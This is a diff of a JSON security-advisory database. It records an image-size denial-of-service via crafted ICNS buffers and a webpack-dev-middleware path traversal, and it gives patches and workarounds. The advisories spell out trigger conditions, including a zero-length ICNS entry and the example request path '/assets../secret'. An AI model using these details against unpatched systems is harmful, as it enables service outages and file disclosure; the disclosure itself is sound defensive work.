+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "image-size: JXL and HEIF parsers allow denial of service through infinite loops"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.0.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-w3rx-r6r6-pgpr/GHSA-w3rx-r6r6-pgpr.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "image-size",
+                    "purl": "pkg:npm/image-size"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0.6.3"
+                        },
+                        {
+                          "fixed": "2.0.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-71330"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-08-07T20:55:24Z",
+                "nvd_published_at": "2026-06-10T14:16:30Z",
+                "severity": "HIGH"
+              },
+              "details": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted ICNS image buffer. Attackers can craft an ICNS buffer containing valid magic bytes and a zero-valued entry length field to trigger an infinite loop in the ICNS parser, as the offset is never incremented when the entry length field is 0, causing the while loop condition to remain true indefinitely.",
+              "id": "GHSA-w3rx-r6r6-pgpr",
+              "modified": "2026-09-24T18:30:11.322772203Z",
+              "published": "2026-06-10T15:31:30Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-71330"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/image-size/image-size"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.vulncheck.com/advisories/image-size-denial-of-service-via-malformed-icns-image-parsing"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "image-size: ICNS parser allows denial of service through an infinite loop"
+            }
+          ]
         },
         {
           "package": {
@@ -172521,7 +175065,7 @@
               },
               "details": "\u003e [!IMPORTANT]\n\u003e CVE-2026-76844 was assigned and published for this issue by VulnCheck on 2026-08-24 without prior coordination with the webpack maintainers or the OpenJS Foundation, which holds the CVE Numbering Authority scope for webpack projects. Neither the maintainers nor the OpenJS CNA were notified before publication, and no fix was available at that time. This advisory is the coordinated record produced by the webpack maintainers and the OpenJS Foundation CNA.\n\n### Impact\n\n`webpack-dev-middleware` resolves a request to a local file in `getFilenameFromUrl`. When the configured `publicPath` has no trailing slash (for example `/assets`), a request that shares that prefix without being under it (for example `/assets../secret`) still passes the containment check, and the `..` guard does not catch it because it runs on the path before the `publicPath` prefix is stripped. The stripped remainder then escapes the configured output directory once joined, so an unauthenticated request can read files outside the output root. Applications serving `webpack-dev-middleware` (directly or via `webpack-dev-server`) with a `publicPath` that does not end in a slash are affected. A development server reachable on the network can be attacked with a single request and no victim interaction.\n\n### Patches\n\nPatched in `webpack-dev-middleware` 8.3.0. There is no backport to the 5.x, 6.x, or 7.x lines; users on those lines should upgrade to 8.3.0 or later.\n\n### Workarounds\n\nConfigure `publicPath` with a trailing slash (for example `/assets/` instead of `/assets`), or upgrade to a patched version.\n\n### References\n\n- [CVE-2024-29180](https://www.cve.org/CVERecord?id=CVE-2024-29180) ([GHSA-wr3j-pwj9-hqq6](https://github.com/webpack/webpack-dev-middleware/security/advisories/GHSA-wr3j-pwj9-hqq6)), the earlier path traversal in the same component that this issue bypasses.",
               "id": "GHSA-g84c-rxfj-3j2c",
-              "modified": "2026-10-03T03:56:01.635170780Z",
+              "modified": "2026-11-14T02:57:07.669911324Z",
               "published": "2026-09-29T16:59:18Z",
               "references": [
                 {
@@ -172568,6 +175112,9 @@
                   "type": "WEB",
                   "url": "https://www.vulncheck.com/advisories/webpack-dev-middleware-path-traversal-via-offset-slice-on-a-non-slash-terminated-publicpath"
                 }
+              ],
+              "related": [
+                "CVE-2026-76844"
               ],
               "schema_version": "1.9.0",
               "severity": [
